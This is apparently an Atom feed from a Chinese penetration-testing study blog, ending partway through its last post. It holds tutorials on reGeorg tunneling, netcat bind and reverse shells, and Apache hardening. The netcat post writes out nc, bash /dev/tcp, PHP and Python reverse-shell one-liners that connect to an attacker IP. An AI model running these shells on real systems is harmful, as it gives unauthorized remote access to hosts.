title="寻找危险函数"></a>寻找危险函数</h4><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><h4 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h4><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener">stack buffer overflow</a></p><p><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3694.html</a></p><p><a href="https://www.cnblogs.com/rec0rd/p/7646857.html" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;系统栈和经典栈溢出&quot;&gt;&lt;a href=&quot;#系统栈和经典栈溢出&quot; class=&quot;headerlink&quot; title=&quot;系统栈和经典栈溢出&quot;&gt;&lt;/a&gt;系统栈和经典栈溢出&lt;/h1&gt;&lt;h3 id=&quot;寄存器ebp和esp&quot;&gt;&lt;a href=&quot;#寄存器ebp和esp&quot; cla
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之reGeorg</title>
    <link href="http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/"/>
    <id>http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/</id>
    <published>2019-11-21T00:38:30.000Z</published>
    <updated>2019-11-27T11:06:16.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具之reGeorg-代理"><a href="#内网渗透工具之reGeorg-代理" class="headerlink" title="内网渗透工具之reGeorg+代理"></a>内网渗透工具之reGeorg+代理</h1><p>继续我们之前的学习，在我们渗透工作中，经常会出现一个服务器连接着两个网卡的情况：一个是连接外网的网卡，另一个是连接内网的网卡。我们的目标就是他连接着的内网，但我们却不能直接使用这台服务器去访问内网，因为上面缺少了我们必要的工具。为此，我们可以将这台服务器设置为我们访问内网的代理，作为跳板机打进内网</p><p>网络拓扑如下图：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.png" alt></p><p>为了打出这样一条隧道，我们可以通过使用 reGeorg+Proxifier/ reGeorg +Prochains 做到，无论是哪种组合，关于 reGeorg 的操作都是一样的，所以我们把两种组合的 reGeorg 都拿出来一起说，再分别介绍不同的两个代理</p><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>安装reGeorg的过程不再赘述，直接 git clone 到 kali 上，使用脚本的时候 cd 进目录就行</p><p>然后我们需要根据目标站点使用的语言上传相应版本的tunnel的脚本，埋下伏笔，上传成功的时候会显示“ 乔治说：看起来一切都很好 ”，哈哈，确实如此。</p><p>然后我们假设文件上传在根目录下，可以通过访问下面的网址： </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://站点的网址/<span class="title">tunnel.php</span></span></span><br></pre></td></tr></table></figure><p>访问到我们上去的隧道文件，只要我们看到下面这样的字眼，说明第一步成功了：</p><blockquote><p>Georg says, ‘All seems fine’</p></blockquote><p>然后我们再回去kali里面进行使用reGeorg的py脚本建立连接，打出一条隧道，使用命令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://站点的网址/tunnel.php(上传reGeorg脚本的地址) -p <span class="number">8888</span>（任意没有服务冲突的端口）</span><br></pre></td></tr></table></figure><p>执行的界面如下：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%95%8C%E9%9D%A2.png" alt></p><p>到目前这一步就算做好了，下面的就是代理的操作了。</p><h2 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h2><p>下面我们开始介绍 Proxifier ，首先安装后打开。然后选择 Profile-proxy servers 设置代理地址和端口（这里选择的是本地端口8888的socks5代理：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/proxixier%E8%AE%BE%E7%BD%AE.png" alt></p><p>然后我们就得配置代理规则（代理规则其实就相当于指定那个软件的流量经过代理，哪些不经过代理）</p><p>一般情况下我们需要使用浏览器访问内网的网页，所以就需要给浏览器配置经过代理，其他不需要代理的软件就这设为direct模式（不经过代理）</p><p> 选择 Profile-proxification Rules，根据自己的需要配置：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AE%E8%A7%84%E5%88%99.png" alt></p><p>然后我们就可以愉快的使用了proxifier了：</p><blockquote><p>选择   右键 -&gt; Proxifier -&gt; Proxy SOCKS 5 127.0.0.1<br>范例：<br>mstsc远程桌面右键使用代理运行实现远控内网；<br>cmd右键使用代理运行实现例如nmap扫描内网等各种功能；</p></blockquote><h2 id="Proxychain-ng"><a href="#Proxychain-ng" class="headerlink" title="Proxychain-ng"></a>Proxychain-ng</h2><p>下面我们开始介绍Proxychain，首先介绍安装：</p><p>先 git clone 到本地，然后进行操作。先进入本地文件夹，然后 ./configure 运行配置文件。等配置完成之后就使用</p><p>make &amp;&amp; make install 进行 make 安装：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain.png" alt></p><p>等上述安装完成后,把当前目录下的配置文件 /src/proxychains.conf 复制到 /etc/proxychains.conf 里面，删除上一层生成的文件夹，然后至此暂时阶段性胜利：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain-1.png" alt></p><p>然后我们对 /etc/proxychains.conf 进行配置，这里使用vim：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br><span class="line">socks4 127.0.0.1 9050 //9050为你自己的端口，需要与reGeorg中设置的端口相同</span><br></pre></td></tr></table></figure><p>界面如下，我们配置sock4的配置信息，9050修改为你需要的端口（因为上面reGeorg使用了8888端口，把9050改为8888），然后保存退出：<img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AEproxychains%E7%AB%AF%E5%8F%A3.png" alt></p><p>最后我们就能愉快的通过如下命令使用 proxychains 了：</p><blockquote><p>在需要设置代理的软件前面加上proxychains，范例：<br>proxychains nmap<br>proxychains sqlmap </p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具之reGeorg-代理&quot;&gt;&lt;a href=&quot;#内网渗透工具之reGeorg-代理&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具之reGeorg+代理&quot;&gt;&lt;/a&gt;内网渗透工具之reGeorg+代理&lt;/h1&gt;&lt;p&gt;继续我们之前的学习，
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之netcat</title>
    <link href="http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/"/>
    <id>http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/</id>
    <published>2019-11-18T08:30:46.000Z</published>
    <updated>2019-11-27T11:06:28.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具总结之netcat"><a href="#内网渗透工具总结之netcat" class="headerlink" title="内网渗透工具总结之netcat"></a>内网渗透工具总结之netcat</h1><p>继续上一篇的思路，继续学习总结内网穿透的工具。这次这个工具是也是老牌的工具，誉为瑞士军刀。不多逼逼直接学习他的使用</p><h2 id="nc反弹服务器shell"><a href="#nc反弹服务器shell" class="headerlink" title="nc反弹服务器shell"></a>nc反弹服务器shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>操作目标机将cmd /Bash shell 绑定到它的特定端口8888，再让攻击机用简单的nc命令连接到8888端口，从而使用目标机的shell服务</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB（Windows/Linux）</p><ul><li><p>在目标机上设置监听端口：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span> -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc -lvp <span class="number">8888</span> -e /bin/sh    [目标机为Linux]</span><br><span class="line"></span><br><span class="line">（<span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口）</span><br></pre></td></tr></table></figure></li><li><p>在攻击机上尝试连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 目标机的ip（ipB） <span class="number">8888</span></span><br></pre></td></tr></table></figure></li><li><p>连接成功之后就会在攻击机上得到远程目标机的shell</p></li></ul><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>攻击机监听它的特定端口8888，再操作目标机使用nc命令反向连接到8888端口，实现反弹shell</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB</p><ul><li>在攻击机上监听端口：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口</span><br></pre></td></tr></table></figure><ul><li>在目标机上尝试反向连接：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e /bin/sh    [目标机为Linux]</span><br></pre></td></tr></table></figure><ul><li>连接成功后会在攻击机上得到远程目标主机的shell</li></ul><h2 id="其他方式反弹shell-Linux服务器"><a href="#其他方式反弹shell-Linux服务器" class="headerlink" title="其他方式反弹shell(Linux服务器)"></a>其他方式反弹shell(Linux服务器)</h2><p>在上面反向连接中，需要目标机上装有netcat的服务，才能将服务器的shell反弹给攻击机。在很多时候，目标机上是没有该服务并且我们不能去上传或者下载到目标机上，那要如何让主机反弹shell呢？我们需要使用替代方法反向连接到攻击主机。</p><p>（注：下面无论哪种方式反弹shell都要先在自己的攻击机上开启端口监听，下面除了Bash反弹这个案例写了出来外，其他都默认用同样的方法在攻击机上用nc开启8888端口监听，然后我就不写出来了，特此说明（就是懒））</p><h3 id="Bash反向shell"><a href="#Bash反向shell" class="headerlink" title="Bash反向shell"></a>Bash反向shell</h3><p>同样在攻击机上监听8888端口等待服务器主动来反向连接</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后我们在目标机（Linux）的bash上执行下面的命令即可反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;＆/dev/tcp/192.168.100.113（攻击机ip）/4444 0&gt;＆1</span><br></pre></td></tr></table></figure><p>命令的解释：</p><ul><li>bash -i 是打开一个交互的bash </li><li>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp</li><li>0&gt;&amp;1 将标准输入重定向到标准输出中 </li></ul><blockquote><p>​    附上Linux中的文件描述符</p><ol><li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; </p></li><li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</p></li></ol></blockquote><ul><li>在此处不论是 “0&gt;&amp;1” 或者 “0&lt;&amp;1”  都是将标准输入重定向到标准输出中； “&gt;&amp;” 和 “&amp;&gt;” 也是同样效果；</li></ul><h3 id="PHP反向shell"><a href="#PHP反向shell" class="headerlink" title="PHP反向shell"></a>PHP反向shell</h3><p>适用于目标机上存在php服务，绝大多数服务器上都会是这种情况。我们在目标机上执行下面命令以反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock = fsockopen("192.168.100.113（攻击机ip）"，8888);exec("/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="Python反向shell"><a href="#Python反向shell" class="headerlink" title="Python反向shell"></a>Python反向shell</h3><p>python不多说了，几乎每台机器都有。在目标机上用一下命令反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.113",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p = subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><p>还有更多的姿势会在后面补充。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;a href=&quot;#内网渗透工具总结之netcat&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;/a&gt;内网渗透工具总结之netcat&lt;/h1&gt;&lt;p&gt;继续上一篇的思路，继续学习总结内网穿
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache安全配置</title>
    <link href="http://bai-ren-1.github.io/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2019-11-04T03:00:59.000Z</published>
    <updated>2020-03-06T09:28:59.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache安全配置"><a href="#Apache安全配置" class="headerlink" title="Apache安全配置"></a>Apache安全配置</h1><p>转载自 <a href="https://www.jianshu.com/p/a8bab3f50c7b" target="_blank" rel="noopener">https://www.jianshu.com/p/a8bab3f50c7b</a> </p><p>隐藏报错信息 -&gt; 隐藏目录列举 -&gt; 配置上传文件权限 -&gt; 配置Apache运行权限 -&gt; 处理Apache日志</p><h2 id="0x00-安全配置思维导图"><a href="#0x00-安全配置思维导图" class="headerlink" title="0x00 安全配置思维导图"></a>0x00 安全配置思维导图</h2><p><img src="/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/1.png" alt></p><h2 id="0x01-错误详情页banner隐藏"><a href="#0x01-错误详情页banner隐藏" class="headerlink" title="0x01 错误详情页banner隐藏"></a>0x01 错误详情页banner隐藏</h2><h3 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h3><p>黑客在渗透的过程中，收集服务器的信息是至关重要的，这对于他在后期漏洞的利用上有很大的帮助。 </p><p><img src="/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/2.png" alt></p><p>查看响应头信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:47:46 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)         <span class="comment">#中间件版本及操作系统</span></span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.22   <span class="comment"># 显示服务端脚本语言及版本号</span></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h3 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件：<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>隐藏中间件信息。修改或者添加以下配置，<strong>隐藏中间件版本和os</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ServerTokens</span> Prod</span><br><span class="line"><span class="attribute">ServerSignature</span> <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>2）修改配置文件：<code>/etc/php5/apache2/php.ini</code>第367行隐藏PHP信息，将expose_php = On修改为Off，<strong>隐藏服务端脚本语言和版本</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">expose_php</span> =  <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>3）保存退出之后，重启apache服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># service apache2 restart</span></span><br><span class="line">Restarting web server apache2                                         [ OK ]</span><br></pre></td></tr></table></figure><p>4）再次访问不存在的页面，已经没有banner信息了。</p><p><img src="/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/3.jpg" alt>查看响应头信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:51:41 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h2 id="0x02-列目录问题"><a href="#0x02-列目录问题" class="headerlink" title="0x02 列目录问题"></a>0x02 列目录问题</h2><h3 id="危害：-1"><a href="#危害：-1" class="headerlink" title="危害："></a>危害：</h3><p>当Web服务器配置不当的时候，如果当前目录不存在默认文件（比如index.html），Apache会列出当前目录下所有文件，造成敏感信息泄露。如下图所示：</p><p><img src="/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/6.png" alt></p><h3 id="修复方法：-1"><a href="#修复方法：-1" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p><code>Options Indexes FollowSymLinks</code></p><blockquote><p>这里的indexes 是指在目录中要存在index文件，如果不存在把文件列出来，如果存在index文件可以直接显</p><p>index文件，因此每个目录都必须存在index文件，如果不存在有可能此目录把文件全部列出来。</p></blockquote><p>2）删除Indexes这个参数，然后重启apache服务。<code>service apache2 restart</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>3）再次访问就出现403 Forbidden页面</p><p><img src="/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/4.png" alt></p><h2 id="0x03-文件权限问题"><a href="#0x03-文件权限问题" class="headerlink" title="0x03 文件权限问题"></a>0x03 文件权限问题</h2><h3 id="危害：-2"><a href="#危害：-2" class="headerlink" title="危害："></a>危害：</h3><p>现在大部分站点都存在文件上传，比如说头像上传，附件上传等等。如果在代码层对上传的文件限制的不够严格，很容易被上传Webshell。一旦被上传Webshell对服务器造成十分大的威胁。</p><h3 id="修复方法：-2"><a href="#修复方法：-2" class="headerlink" title="修复方法："></a>修复方法：</h3><p>如果我们对存放上传文件的目录限制脚本执行的权限的话，上传的脚本文件就无法执行，在一定程度上能够减轻黑客攻击造成的危害，并且还不影响正常的业务，上穿的图片不需要执行权限，也能正常打开。</p><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/html/zk/&gt;</span> <span class="comment">#这里文件夹设置想要限制的 </span></span><br><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>2）此时上传的小马已经无法执行</p><p><img src="/2019/11/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/5.png" alt></p><h2 id="0x04-服务器运行权限问题"><a href="#0x04-服务器运行权限问题" class="headerlink" title="0x04 服务器运行权限问题"></a>0x04 服务器运行权限问题</h2><p>1）查看Apache的进程：lsof -i:80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># lsof -i:80</span></span><br><span class="line">COMMAND   PID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">apache2 11302     root    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11304 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11305 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11306 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11307 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11308 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 13248 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 14885 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure><p>2）或者ps aux|grep apache|grep -v grep</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ps -aux | grep apache |grep -v grep</span></span><br><span class="line">root      11302  0.0  0.2  71104  2340 ?        Ss   Dec04   0:03 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11304  0.0  0.2  71176  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11305  0.0  0.2  71176  2256 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11306  0.0  0.2  71200  2284 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11307  0.0  0.2  71184  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11308  0.0  0.2  71176  2276 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  13248  0.0  0.2  71176  2352 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  14885  0.0  0.2  71176  2368 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br></pre></td></tr></table></figure><p>第一行是Apache的主进程，是以root运行的。因为Apache的Web开放的端口是80或者443，小于1024的端口需要有root权限，因此主进程必须是root.从第二行开始为Apache的子进程。用户为www-data，是Ubuntu中运行服务的默认用户，权限较低。</p><p>如果用户为www-data用户的话，此时就算黑客拿到一个webshell，权限也是比较低的。</p><p>3）配置权限</p><p>如果管理配置不当（默认安装为www-data），这里是高权限用户的话，需要更改为低权限用户。</p><p>配置文件路径为：/var/apache2/envvars文件中16、17行进行配置：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.</span></span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_USER=www-data</span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_GROUP=www-data</span><br></pre></td></tr></table></figure><h2 id="0x05-Apache日志文件格式"><a href="#0x05-Apache日志文件格式" class="headerlink" title="0x05 Apache日志文件格式"></a>0x05 Apache日志文件格式</h2><p>Apache会生成两个主要的日志文件，一个是Web访问日志<code>access.log</code>，一个是记录服务器运行时出错的日志<code>error.log</code>。</p><p>1）配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>中定义了日志格式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">212</span> LogFormat <span class="string">"%v:%p %h %l %u %t \"%r\" %&gt;s %O \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> vhost_combined</span><br><span class="line"><span class="attribute">213</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O 